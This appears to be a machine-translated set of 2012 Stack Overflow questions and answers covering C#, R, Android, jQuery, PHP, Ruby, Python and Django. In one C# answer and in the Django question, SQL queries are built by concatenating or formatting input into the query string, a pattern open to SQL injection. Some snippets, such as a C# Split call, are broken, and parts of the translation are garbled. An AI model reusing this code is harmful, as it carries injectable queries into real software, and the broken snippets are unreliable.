通常会发生这种情况，因为您尚未保存进行插座修改的文件。要解决此问题而无需每次重新启动 Xcode，您只需在完成修改后保存标题（正如@Steven Fisher 指出的命令 + 选项 + s 保存所有），如果这不起作用，则构建通常会（命令 + 移位 + b) 如果所有其他方法都失败了，那么应该好好清理（command+shift+k）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:09:36.923

当您的项目被编入索引时，它可能会延迟。索引可能需要一些时间，具体取决于项目的大小、依赖项等。索引的复杂性实际上是编译的一大块，索引并不意味着是侵入性的（阻塞 IDE 或消耗所有资源）。

# c# - 带有网络搜索的 Windows 应用程序

> ID：12328154
> 
> 赞同：0
> 
> 时间：2012-09-08T04:58:55.203
> 
> 标签：c#, c, vb.net, winapi, mfc

> **可能重复：**
> [以编程方式获取页面截图](https://stackoverflow.com/questions/1981670/programmatically-get-screenshot-of-page)

我正在使用 winapi 开发一个小型桌面程序

1.  我想要的是该应用程序将具有带有一些按钮的文本框。用户可以在文本框中键入一个字符串并点击搜索按钮。

2.  之后，程序将在 google 上搜索该字符串并将搜索结果页面保存为图像文件，所有这些都将在后台完成，无需打开新窗口。

如果这可以用 VB 或 C# 或 MFC 等其他编程语言轻松完成，请发表评论

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:57:31.127

```
string filename = Application.StartupPath + "\\abc.Png";
        int width = -1;
        int height = -1;

        WebBrowser wb = new WebBrowser();
        wb.ScriptErrorsSuppressed = true;
        wb.Navigate("http://www.google.com/search?q=" + txtSearch.Text);
        while (wb.ReadyState != WebBrowserReadyState.Complete)
        {
            Application.DoEvents();
        }

        // Set the size of the WebBrowser control
        wb.Width = width;
        wb.Height = height;

        if (width == -1)
        {
            // Take Screenshot of the web pages full width
            wb.Width = wb.Document.Body.ScrollRectangle.Width;
        }

        if (height == -1)
        {
            // Take Screenshot of the web pages full height
            wb.Height = wb.Document.Body.ScrollRectangle.Height;
        }

        // Get a Bitmap representation of the webpage as it's rendered in the WebBrowser control
        Bitmap bitmap = new Bitmap(wb.Width, wb.Height);
        wb.DrawToBitmap(bitmap, new Rectangle(0, 0, wb.Width, wb.Height));
        wb.Dispose();

        bitmap.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
        MessageBox.Show("Image Saved"); 
```

# c - 链接到外部 C 库的 R 包

> ID：12328156
> 
> 赞同：16
> 
> 时间：2012-09-08T04:59:37.183
> 
> 标签：c, r, graph, linker, igraph

我有一些利用[igraph](http://igraph.sourceforge.net/index.html)库的 c 代码。我想在它周围放一个 R 包装器并将其作为 R 包发送给 CRAN。

[igraph](http://cran.r-project.org/web/packages/igraph/index.html)在 CRAN 上已经有一个 R 端口，所以我的 R 包 'foo' 依赖于 R 的 igraph 是有意义的。由于 foo 使用自己的依赖于 C igraph 的 C 代码，我如何将我的 C 函数链接到原始 igraph 库？我读过这是在一个名为 Makevars 的文件中完成的，但是链接到外部库非常麻烦。

如果这不可能，是否最好只复制整个 igraph 源代码并将整个内容放入我的 /src 目录中？R igraph 包已经有一个名为 Makevars 的文件，但我不明白所有 c 文件是如何构建的——通常在我的 Makefile 中我有类似 gcc（一些 .c 源文件列表）-o 之类的东西，但 Makevar 只包含

```
PKG_CFLAGS=-DUSING_R -I. -Ics -Iglpk -Iglpk/amd -Iglpk/colamd \
-g -O2 -I/usr/include/libxml2 -g -O2 -I/usr/include/libxml2 -DNDEBUG \
-DPACKAGE_VERSION=\"0.6\" -DINTERNAL_ARPACK \
-DIGRAPH_THREAD_LOCAL=/**/
PKG_CXXFLAGS= -DUSING_R -DIGRAPH_THREAD_LOCAL=/**/ -DNDEBUG
PKG_LIBS=-lxml2 -lz -lpthread -licucore -lm -lgmp  $(FLIBS) $(LAPACK_LIBS) $(BLAS_LIBS)

all: $(SHLIB) 
```

并且没有其他 Makefile。总之，如何将 C 代码放入依赖于另一个 C 库的 R 包中，以及如何编写相应的 Makevars（或 Makefile）来合并 C 函数？

[此处](https://stackoverflow.com/questions/5171516/where-is-a-good-tutorial-on-creating-an-r-package-with-c-source-code)发布了一个较旧的问题，但似乎只是链接以帮助编写您自己的不依赖于任何东西的 C 代码。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T13:44:51.930

这里有几个问题：

1.  包 'foo' 可以可靠地链接到包 'bar' 吗？正如 Gabor 在他之前的评论中所暗示的那样，“编写 R 扩展”在第 5.8 节“链接到其他包”的开头说“不，一般不”。

2.  可以将 C 源代码放入包中以构建依赖于另一个库的包：是的，当然，CRAN 上的许多包都这样做。例如，根据 GSL、JPEG/TIFF 图形库、XML 或……选择一个包示例。您可以研究这些资源。这不是一件容易的事，但是如果您研究这些包，您应该了解编写 R 扩展中的文档以及此处相关问题的其他答案。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-08T17:18:46.823

我对“编写 R 扩展”的阅读略有不同。第 5.8.1 节（处理类 unix 的操作系统）的第 1 段说，链接到*共享*库是可能的，但不可移植或不推荐。第 2 段说*静态*库是可以的（段落开头的'This'令人困惑；它指的是什么？）因为packA提供的静态库可以在安装packB时被packB发现，然后合并到动态库中。这要求 packA 提供一个静态库，因此 packA 意识到它的作用就是这样做；相反，许多包会将它们的角色视为为它们包装的库的功能子集提供 R 接口，并提供一个链接到其自己包中的共享库的共享对象。

一个例子是 Bioconductor 中的[Rsamtools](http://bioconductor.org/packages/2.10/bioc/html/Rsamtools.html)包，它创建 samtools 库的静态版本，并为想要访问静态库的包提供（棘手的）机制（[小插图](http://bioconductor.org/packages/2.10/bioc/vignettes/Rsamtools/inst/doc/Rsamtools-UsingCLibraries.pdf)提供事物的依赖包视图）。提供静态库的绝对路径很重要，`PKG_LIBS="-l$(PKGB_PATH)/libpackB.a"`以避免静态链接到系统提供的同一库（使用 packA 提供的标头）。

@DirkEddelbuettel 几乎肯定自己已经走上了这条路，并会指出我的错误。我同意他在下面的评论，即使用静态库是次优的（主要从内存消耗的角度来看？），但要选择避免第 5.8.1 段中提到的可移植性原因。

# android - 从 InputMethodService 更改文本颜色

> ID：12328158
> 
> 赞同：0
> 
> 时间：2012-09-08T05:00:19.383
> 
> 标签：android

我正在修改姜饼键盘。我想更改我正在输入的文本的颜色。当我使用输入文本时它是可能的，`InputConnection.setComposingText(CharSequence, cursorPosition)`因为该方法的参数`setComposingText`允许一个`Spannable`类型。但是当我按下空格按钮时，即提交文本时，颜色会恢复为默认值。

`InputConnection`的`commitText`方法采用与 相同的参数`setComposingText`。但是颜色没有变化。我怎样才能克服这个问题？

将不胜感激任何帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:00:05.307

## public abstract boolean [commitText](http://developer.android.com/reference/android/view/inputmethod/InputConnection.html#commitText%28java.lang.CharSequence,%20int%29) (CharSequence text, int newCursorPosition)

> ```
> Commit text to the text box and set the new cursor position. Any composing text set previously will be removed automatically. 
> ```

commitText 函数仅将原始文本发送到 TextBox 删除任何特殊的组合样式或它周围的其他状态。因为这取决于应用程序应该如何处理文本，而不是**输入法**的责任。文本可以支持什么样式完全取决于各自的应用程序。

# java - gwt 开发模式运行时的服务器端测试用例

> ID：12328159
> 
> 赞同：0
> 
> 时间：2012-09-08T05:00:36.073
> 
> 标签：java, unit-testing, gwt, tomcat, war

所以我有这个（有点）奇怪的想法——正在开发的系统通过各种服务与外部世界通信，但它完全是服务器端的，并且被部署为单一的战争。我想为它编写一个基本的 UI（开发/调试级，不用于生产）。主要目标：

*   避免调用系统服务，而是直接在 java 对象上调用方法
*   使用 GWT
*   必须从测试用例 (testng) 和部署到 tomcat 的战争中工作（最好在开发和生产 gwt 模式下）
*   保持独立，限制对系统的更改

那么......如何用gwt做到这一点？在部署到 tomcat 时，我会将两者都投入到同一场战争中。（因为不同的战争有不同的类加载器）。运行测试用例（集成，它们使用 db 和所有东西）时，我会在初始化期间启动嵌入式码头并注册新的 gwt servlet。

好的，这听起来可行。但是开发模式呢？我希望能够启动常规开发模式，这将允许

*   修改 UI 代码（显然可以），以及
*   修改服务器端代码（我通常会使用 jrebel 来实现） - 但在这种情况下如何运行测试用例？我肯定不会重写它们。

放弃在同一个 jvm 中运行 UI 和系统的想法会有所帮助并且可以很好地分离，但也会迫使我编写一些毫无意义的 RPC/RMI/东西。

关于如何解决这个问题的任何见解？

顺便说一句 - 这只是一个下班后的项目，所以疯狂的我永远不会在真实系统中做那个想法是受欢迎的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T09:47:24.447

在单独的 JVM 中运行后端（Tomcat、Jetty 等）和前端（GWT 开发模式）可以正常工作。这实际上是现在或多或少推荐的方法（特别是如果您想在某些时候使用 SuperDevMode）。

这是我使用eclipse的开发策略：

1.  在调试模式下使用 WTP 和 Jetty 启动后端服务器（当我在后端更改某些内容时，JRebel 用于热交换类）。
2.  启动 GWT 开发模式
3.  在浏览器中打开 GWT 应用程序

这样，当我在 GWT 部分更改某些内容时，我只需刷新浏览器，我就会看到 UI 中的更改。
JRebel 负责后端部分的所有更改。

前端和后端之间的通信方式与在生产模式（`RequestFactory`或`RPC`）`RequestBuilder`中的方式相同。

# jquery - jQuery 图像动画

> ID：12328161
> 
> 赞同：0
> 
> 时间：2012-09-08T05:01:32.660
> 
> 标签：jquery

当鼠标悬停时，我有一排图像动画 trought jQuery（缩放效果），然后回到原来的大小，然后鼠标移出。

问题是当图像被缩放时，它会增加其大小并将表格行的其他图像推到两侧。

它有办法防止这种情况吗？即使图像高于另一个图像。

这是代码：

```
$(document).ready(function(){
  $("img.menu").mouseover(function(){
    $(this).animate({height:300,width:300,opacity:1.0},"fast");
  });
  $("img.menu").mouseout(function(){
    $(this).animate({height:256,width:256,opacity:1.0},"fast");
  });
}); 
```

img.menu 图像放置在 HTML 表格行中。

图片在这里：

```
<table border="0" width="700" height="350">
<tr>
<td><img id="about" class="menu" src="img/agenda.png" /></td>
<td><img id="links" class="menu" src="img/laptop.png" /></td>
<td><img id="toolbar" class="menu" src="img/hd.png" /></td>
</tr>
</table> 
```

每个默认为 256x256

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:09:01.960

尝试这样的事情

```
$(document).ready(function(){
  $("img.menu").mouseover(function(){
   $(this).css({'z-index':'9999','position':'absolute'}); 
   $(this).animate({height:300,width:300,opacity:1.0},"fast");
  });

  $("img.menu").mouseout(function(){
    $(this).css({'z-index':'','position':''}); 
    $(this).animate({height:256,width:256,opacity:1.0},"fast");
  });
}); 
```

# c# - 如何从 SQL 数据库中的列中检索子 字符串到 ListBox

> ID：12328172
> 
> 赞同：0
> 
> 时间：2012-09-08T05:04:39.907
> 
> 标签：c#, asp.net, sql-server-2008

请帮我解决以下问题：

我正在使用`SQL database server 2008`，其中有一个包含列的表格，如附图所示。![我想检索 ToolTip 列并在 **Controls:** 之后提取字符串，然后将 type=value 字符串分开并分别在 <code>ListBox</code> 中列出](../Images/72705cf6576fdf2a6f58a88f2feae4b5.png)

我想检索 ToolTip 列并在**Controls:**之后提取字符串：并将 type=value 字符串分开并单独列出`ListBox`。

然后我想遍历每一行获取列表并将该列表与另一组类似列表进行比较，并检查它们是否具有相同的字符串列表。我没有尝试过任何代码，因为我一开始不知道如何开始。任何帮助将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:57:17.430

如果你有就更好了

**Profile_Controls**表

```
Profile_Name       Controls_Key     Controls_Value
-----------------------------------------------------
Lamp_Profile1      ON_OFF           ON
Lamp_Profile1      BRIGHTNESS       NONE
Fan_Profile1       ON_OFF           ON
Fan_Profile1       SPEED            NONE
..... 
```

然后你可以选择

```
Select Controls_Key+'='+Controls_Value AS Settings From Profile_Controls Where Profile_Name = 'Fan_Profile1'

Results
-----------------
Settings
---------------------
ON_OFF=ON
SPEED=ON 
```

这为您提供了更大的灵活性，因为您可以过滤、JOIN、COMPARE 和使用其他内置 SQL 功能

如果您仍然想像拥有它一样维护您的表结构

```
string[] mysplit = Tool_Tip.Split(s.Split(new string[]{"Controls:"}, StringSplitOptions.RemoveEmptyEntries);

string controls = mysplit[1].Substring(0); //ON_OFF=On;BRIGHTNESS=NONE

string[] eachSettings = controls.Split(';');

//eachSettings[0] = ON_OFF=ON
//eachSettings[1] = BRIGHTNESS=NONE 
```

更新

```
public System.Data.DataTable GetProfileSettings(string profilename)
{
   string sql = "Select Controls_Key+'='+Controls_Value AS Settings From Profile_Controls Where Profile_Name = '"+profilename+"'";
   //write ADO.Net code here to get settings into DataTable
   //DataTable dt = blah blah blah;

   return dt;
} 
```

在您的页面中

```
protected void SomeEvent_Handler(object sender, EventArgs e)
{
   myListBox2.DataSource = GetProfileSettings("FanProfile1");
   myListBox2.DataTextField = "Settings";
   myListBox2.DataBind();
} 
```

您可以使用此链接作为将项目添加到列表框的参考[如何将 SQL 中的逗号分隔值分别检索到列表框](https://stackoverflow.com/questions/12312842/how-to-retrieve-commas-delimited-values-in-sql-to-a-listbox-separately/12312901#12312901)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:23:44.680

[String.Split](http://msdn.microsoft.com/en-us/library/system.string.split.aspx)和更多关于[SqlConnection](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection%28v=vs.100%29.aspx)和 SqlCommand的阅读

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T05:47:45.807

我们如何触发这样的查询

```
select tooltip from FooTable where Profile_Type='Foo_Profile_Type' and Profile_Name = 'Foo_Profile_Name' 
```

并得到

```
"Type = LAMP;Profile = Lamp_Profile1;Controls:ON_OFF = ON;BRIGHTNESS = NONE;" 
```

然后

```
string str = returnedstring.Split(new string[]{"Controls:"})[2]; 
```

会给你

```
"Controls:ON_OFF = ON" 
```

# cookies - 是否所有浏览器都以类似的格式将信息存储在 cookie 中？

> ID：12328173
> 
> 赞同：1
> 
> 时间：2012-09-08T05:04:45.070
> 
> 标签：cookies, browser, client-side, session-cookies

实际上，除了我的问题，我还有另一个问题；cookie 文件的扩展名是什么？我该如何探索它？

# java - 使用 CharToArray 和 foreach 以根据用户选择增加或减少字母

> ID：12328176
> 
> 赞同：0
> 
> 时间：2012-09-08T05:05:18.643
> 
> 标签：java, arrays, for-loop

在我的程序快结束时，我将用户输入变成了一个名为 letter 的字符数组。我想遍历字母，对于数组中的每个“字母”，我想添加或减去 shiftCode 的值。shiftCode 可以是正数或负数。我有一小部分的功能只是在“字母”的第一个字母上加 1。

有人可以告诉我如何使用 i++ 来遍历字母中的每个字母并使用 shiftCode 值进行加减吗？

我认为它看起来像

```
for(shiftCode; shiftCode === 26; shiftCode++) {
     letter[EVERY LETTER IN THIS THING?] += shiftCode;
} 
```

我似乎无法弄清楚如何通过每个字母迭代 shiftCode 的值。如果有人能指出我正确的方向，我将不胜感激。

谢谢你，亚伦

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/*
 * This program is designed to -
 * Work as a Ceasar Cipher
 */

/**
 *
 *
 */
public class Prog3 {
    static String codeWord;
    static int shiftCode;
    static int i;
    static char[] letter;

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
        // Instantiating that Buffer Class
        // We are going to use this to read data from the user; in buffer
        // For performance related reasons
        BufferedReader reader;

        // Building the reader variable here
        // Just a basic input buffer (Holds things for us)
        reader = new BufferedReader(new InputStreamReader(System.in));

        // Java speaks to us here / We get it to query our user
        System.out.print("Please enter text to encrypt: ");

        // Try to get their input here
        try {    
            // Get their codeword using the reader
            codeWord = reader.readLine();

            // What ever they give us is probably wrong anyways.
            // Make that input lowercase
            codeWord = codeWord.toUpperCase();
            letter = codeWord.toCharArray();
        }
        // If they messed up the input we let them know here and end the prog.
        catch(Throwable t) {
            System.out.println(t.toString());
            System.out.println("You broke it. But you impressed me because"
                    + "I don't know how you did it!");
        }

        // Java Speaks / Lets get their desired shift value
        System.out.print("Please enter the shift value: ");

        // Try for their input
        try {
               // We get their number here
               shiftCode = Integer.parseInt(reader.readLine());
        }
        // Again; if the user broke it. We let them know.
        catch(java.lang.NumberFormatException ioe) {
            System.out.println(ioe.toString());
            System.out.println("How did you break this? Use a number next time!");
        }
        letter[1] += 1;
        System.out.println(letter[1]);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:13:08.523

这是迭代数组的一种方法。

```
 for(int i = 0; i < letter.length; i++) {
        // using i, you can manipulate and access all elements of the array.
        letter[i] -= shiftCode; // may want more logic in this case.
    } 
```

我还注意到您没有很好地处理错误情况；您应该将处理块内部的*所有*代码包装起来。`reader``try...catch`

# javascript - popstate/pushstate 和自动运行 AJAX 的限制

> ID：12328180
> 
> 赞同：0
> 
> 时间：2012-09-08T05:07:03.070
> 
> 标签：javascript, ajax, html, url

从我收集到的信息来看，只要你点击一个事件，popstate/pushstate 就会物理地改变 url 地址。在下面的示例页面中，每当您单击导航栏中的链接时，都会调用 ajax 并且 url 会更改。但是，如果我要复制更改后的 url 地址并将其输入为网址，它会将我发送到网站的主页。用户是否可以转到更改后的 url 并自动调用与更改后的 url 地址相关的 ajax？如果是这样，我必须寻找什么功能？

网站演示主页： [http ://html5.gingerhost.com/](http://html5.gingerhost.com/)

更改的网站地址仍然指向主页，而不是“伦敦”部分 [http://html5.gingerhost.com/london](http://html5.gingerhost.com/london)

编辑：我找到了这个有用的链接，但还有其他有用的教程或建议吗？ [http://fortuito.us/diveintohtml5/examples/history/pepper.html](http://fortuito.us/diveintohtml5/examples/history/pepper.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:57:06.480

以backbone.js 为例。[http://backbonejs.org](http://backbonejs.org)

鉴于您的服务器必须知道如何响应您的所有 url，在 DOM 加载后的最基本实现中，您将需要解析 url 以确定您在应用程序中的位置，以了解哪些 AJAX 调用触发以及哪些视图等加载。您可以在不使用诸如骨干网之类的框架的情况下实现这一点，但我强烈建议您检查一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T17:27:39.207

我发现的答案是肯定的。使用诸如 PJAX 之类的程序会自动为您做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-06T17:22:32.243

好吧，如果它有用的话：如果你想轻松实现这样的导航，

你可以使用[https://github.com/binarymind/jquery-navigate](https://github.com/binarymind/jquery-navigate)

要测试它，只需在 jquery 脚本之后添加您的头脑：

```
<script type="text/javascript" src="https://raw.github.com/binarymind/jquery-navigate/master/navigate.js" ></script> 
```

在刚刚阅读了 github 中的文档之后，如果有任何问题，请毫不犹豫地问我，很乐意提供帮助

# php - PHP：检查日期时间以查看它是否即将到来

> ID：12328181
> 
> 赞同：1
> 
> 时间：2012-09-08T05:07:40.323
> 
> 标签：php, sql, date, datetime

我从数据库中获得了一个 DATETIME，我需要能够检查该日期是否在从现在起 30 天内。

```
$renewal_date = $row['renewal_date'];
$current_time = new DateTime();
$interval = $renewal_date->diff($current_time); 
```

这对我不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:20:49.310

Try something like this

```
$renewal_date = new DateTime($row['renewal_date']);
$cutoff= new DateTime('+31 days 00:00');

if ($renewal_date < $cutoff && $renewal_date >= new DateTime)
    echo 'Renewal Time!';
else
    echo 'All OK!'; 
```

Remove the && condition if you want to show renewal for dates in the past

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:15:56.353

Are you sure that $row['renewal_date'] is a DateTime object?

My impression is that this is a value that you take from a database rather than a DateTime object.

Try a var_dump($renewal_date) and if this is a string containing a date value, you should use something like:

```
$renewal_date = new DateTime ($row['renewal_date']);
$current_time = new DateTime();
$interval = $renewal_date->diff($current_time); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T05:16:06.873

`$renewal_date` is not a PHP [DateTime](http://www.php.net/manual/en/class.datetime.php) object. You can do `var_dump($renewal_date);` to verify this.

Check out the [DateTime::diff](http://php.net/manual/en/datetime.diff.php) manual for examples. You'll want to convert your date to a DateTime object using something like this:

```
$datetime1 = new DateTime($renewal_date); 
```

Then it should work.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T05:15:07.303

```
$renewal_date = strtotime($renewal_date); // maybe need it depending of sql format of date

if (abs($renewal_date - time()) < 86400*30)
{
    echo 'less than 30 days from now';
} 
```

* * *

**编辑 1**

`abs($renewal_date - time())`给出了从现在开始的一段时间 ( `time()`)，它应该指的是未来。事实上，这种情况也可以用于过去的时期......

`< 86400*30`说，过失肯定不及30天……

那是我的 2 美分：)

# ruby - 如何在 Sinatra 中发送响应但继续执行？

> ID：12328183
> 
> 赞同：6
> 
> 时间：2012-09-08T05:07:51.697
> 
> 标签：ruby, performance, sinatra, redis, rack

我正在制作一个小型 sinatra 应用程序。它会进行几次 Redis 调用，返回数据，然后进行最后一次 Redis 调用以保存“统计信息”。

到目前为止，如果我想提前终止请求（基于输入），我发现我可以使用[halt](http://www.sinatrarb.com/intro#Halting)：

```
# code code
halt send_blank if is_blocked? SETTINGS, host
# code code 
```

最后，我想要这样的东西：

```
response.body = JSON.generate(outgoing)
# update user
STATISTICS.hset('u:' + userID, 'data', JSON.generate({'ip' => request.ip, 'time' => Time.now.to_f.to_s})) 
```

是否可以发送响应然后执行 5~ ms redis write，这样客户端就不必等待了？无论我在哪里或如何放置最终统计 redis 调用，它都会将响应的发送延迟一些毫秒 - 不能欺骗 sinatra。

这可以在 Node 中轻松完成，但只需编写我想要完成的内容，它会在响应发送后触发；据我了解，这里的代码将在回击响应之前阻止执行大约 5 毫秒。

我试过使用 after .. do 过滤器，它们可以正常工作，除了你不能向它们传递 response.body 中的数据以外的任何东西——这意味着你不能向过滤器传递任何不会的东西输出！可以通过分配给 post("/") 范围之外的变量来避免这个问题，但是每秒有 100 多个请求，我希望你能看到如何通过各种“全局”交换数据会成为一个大问题。

这似乎很简单，但我找不到比 .. do filters 在文档中更好的东西了。

我可以创建一个线程或其他东西来使 redis.hset() 进程非阻塞，这行得通吗？似乎是硬核它。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T12:27:45.343

分叉 redis 写入应该可以工作。

像这样的东西：

```
response.body = JSON.generate(outgoing)
fork do
    # update user
    redis = Redis.new(:host => "your_host_name", :port => your_port_number)
    redis.hset('u:' + userID, 'data', JSON.generate({'ip' => request.ip, 'time' => Time.now.to_f.to_s}))
end 
```

# python - 如何获取 OrderedDict 中的“下一个”项目？

> ID：12328184
> 
> 赞同：13
> 
> 时间：2012-09-08T05:08:04.983
> 
> 标签：python, ordereddictionary

我正在使用 OrderedDict 随机访问列表，但现在想要`next`列表中的项目来自我拥有的项目：

```
foo = OrderedDict([('apple', 4), ('banana', 3), ('orange', 2), ('pear', 1)])
apple = foo['apple'] 
```

如何使用 just`foo`和获取香蕉`apple`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-08T09:26:57.677

如果您可以访问有意保持私有的 OrderedDict 实现部分：

```
>>> class MyOrderedDict(OrderedDict):
...     def next_key(self, key):
...             next = self._OrderedDict__map[key][1]
...             if next is self._OrderedDict__root:
...                     raise ValueError("{!r} is the last key".format(key))
...             return next[2]
...     def first_key(self):
...             for key in self: return key
...             raise ValueError("OrderedDict() is empty")
... 
>>> od = MyOrderedDict([('apple', 4), ('banana', 3), ('orange', 2), ('pear', 1)])
>>> od.next_key("apple")
'banana'
>>> od.next_key("banana")
'orange'
>>> od.next_key("orange")
'pear'
>>> od.next_key("pear")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 5, in next_key
ValueError: 'pear' is the last key
>>> od.first_key()
'apple' 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-08T05:19:19.940

I shudder to think how slow this will be on a list of size, but the *only* way I've come up with so far...

```
>>> foo.items()[foo.keys().index('apple') + 1]
('banana', 3) 
```

Edit:

The example was slightly contrived; my actual collection is keyed by dates. If I need the entry after `today`; found a solution using dropwhile...

```
>>> foo = OrderedDict([(datetime.date(2000,1,1), 4), (datetime.date(2000,5,23), 3), datetime.date(2000,10,1), 2), (datetime.date(2000,12,31), 1)])
>>> today = datetime.date(2000,1,30)
>>> foo.items()[foo.keys().index((itertools.dropwhile(lambda d: d<today, foo)).next())]
(datetime.date(2000, 5, 23), 3) 
```

Quite a mouthful.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2019-06-26T14:11:46.780

Python 3.X

dict.items 将返回一个可迭代的 dict 视图对象而不是一个列表。我们需要将调用包装到一个列表中以使索引成为可能：

```
>>> from collections import OrderedDict
>>> 
>>> foo = OrderedDict([('apple', 4), ('banana', 3), ('orange', 2), ('pear', 1)])
>>> 
>>> def next_item(odic, key):
...     return list(odic)[list(odic.keys()).index(key) + 1]
... 
>>> next = next_item(foo, 'apple')
>>> print(next, foo[next])
banana 3 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-08T06:44:40.720

从您的代码中重新设计，我想这种方式会更好一些：

```
import collections as co
import datetime as dt
import itertools as it

foo = co.OrderedDict([
    (dt.date(2000,1,1), 4),
    (dt.date(2000,5,23), 3),
    (dt.date(2000,10,1), 2),
    (dt.date(2000,12,31), 1)
])
today = dt.date(2000,1,30)

fooiter = it.dropwhile(lambda d: d <= today, foo)
print next(fooiter)
print list(fooiter) 
```

基本上在正确的地方有迭代器就足够了。

从任何位置开始迭代都会很酷，但不确定是否可能。需要一些思考。

# jquery - jquery $("#dropdown").val 在 .change 时不会触发

> ID：12328185
> 
> 赞同：1
> 
> 时间：2012-09-08T05:08:15.833
> 
> 标签：jquery, drop-down-menu, onchange

我正在编写一个简单的网页，它有两个带有年龄的下拉列表，说它们都包含从 1 到 30 的选项。我希望下拉 2 更改为用户为下拉 1 选择的值。例如，首先，这两个下拉列表的值都是 1-30，默认值都是 1。用户从第一个下拉列表中选择 12，我希望第二个下拉列表自动更改为 13。

所以我想出了这个javascript片段，

```
 <script>
    $(document).ready(function(){
        $("#selectfromage").change(function(){
            var fromage=$("#selectfromage").val();
            $("#selecttoage").val(fromage);
            alert(fromage);
        });
    });
</script> 
```

但是这种行为有点奇怪，如果我从 dropdown1 中选择一个值，警报会触发，但 .val 不会。但是如果我刷新页面，下拉列表 2 会自动更改为下拉列表 1 中的值。

请帮忙。

这是我的 php 源代码中的片段

```
<select name="fromage" id="selectfromage" data-inline="true" data-mini="true">
                    <option value="1">1</option>
                    <option value="2">2</option>
                    <option value="3">3</option>
                    <option value="4">4</option>
                    <option value="5">5</option>
        </select>
<script>
        $("#selectfromage").change(function(){
            var fromage=$("#selectfromage").val();
            $("#selecttoage").val(fromage);
        });
</script>
<select name="toage" id="selecttoage" data-inline="true" data-mini="true">
                    <option value="1">1</option>
                    <option value="2">2</option>
                    <option value="3">3</option>
                    <option value="4">4</option>
                    <option value="5">5</option>
        </select> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:12:56.500

仅在 dom 准备好时才放代码，

```
$(document).ready(function () {
 $("#selectfromage").change(function(){
   var fromage=$("#selectfromage").val();
   $("#selecttoage").val(fromage);
 });
}); 
```

或将代码放在您正在访问的元素下方，如下所示，

```
<select name="fromage" id="selectfromage" data-inline="true" data-mini="true">
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
</select>
<select name="toage" id="selecttoage" data-inline="true" data-mini="true">
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
</select>
<script>
    $("#selectfromage").change(function () {
        var fromage = $("#selectfromage").val();
        $("#selecttoage").val(fromage);
    });
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:28:33.777

这就是您如何选择比第一个大一个的第二个下降值。

**[现场演示](http://jsfiddle.net/rajaadil/ncZTD/)**

```
$("#selectfromage").change(function() {
    var fromage = $("#selectfromage").val();
    alert($("#selecttoage option").length);
    if (+fromage < $("#selecttoage option").length)
        $("#selecttoage").val(+fromage + 1);
    else 
        $("#selecttoage").val(fromage);
});​ 
```

# python - 我的代码表现不佳

> ID：12328189
> 
> 赞同：1
> 
> 时间：2012-09-08T05:09:17.780
> 
> 标签：python, django, django-views

我的代码存在性能问题。我对 Python 有点陌生，我想不出更好的方法来执行以下代码。

我有一个外部数据库，其中有一个名为“cdr”的表，它不是 django 项目的一部分，我需要对这些行进行一些计算。为了获得我的变量值，我正在对我的 cdr 表中的每一行进行查询，这使我的代码非常慢。

这是我在 view.py 中的课程

```
def cdr_adm(request):
        cursor = connections['cdr'].cursor()
        cursor.execute("SELECT calldate, dst, billsec, accountcode, disposition, userfield FROM cdr where calldate >= '%s' and calldate < '%s' and disposition like '%s' and accountcode like '%s' and dst like '%s' and userfield like '%s'" %(start_date, end_date, status, customer, destino, provider))
        result = cursor.fetchall()
        time = 0
        price = 0
        price_prov = 0
        count = 0
        time_now = 0
        ANS = 0
        asr = 0
        rate_cust = 0
        rate_prov = 0

        for call in result:
                if call[3]:
                        #These 2 lines are the problem - It's very slow to run for all rows.
                        rate_cust = User.objects.get(username = call[3])
                        rate_prov = Provider.objects.get(name = call[5])
                        time_now = call[2] / 60
                        time =  time + time_now
                        count = count + 1
                        price = price + (float(rate_cust.first_name) * time_now)
                        price_prov = price_prov + (float(rate_prov.rate) * time_now)
                        if call[4] == "ANSWERED":
                                ANS = ANS + 1
        time = float(time)
        lucro = price - price_prov
        lucro = float(lucro)
        if count > 0:
                asr = (ANS / count)  * 100
        return render_to_response("cdr_all.html",
                {'calls':result,'price':price,'time':time,'count':count,'customers':customers, 'providers':providers,'price_prov':price_prov, 'lucro':lucro, 'asr':asr }, context_instance=RequestContext(request)) 
```

我正在考虑创建一个字典并在其中搜索，但我也不确定。

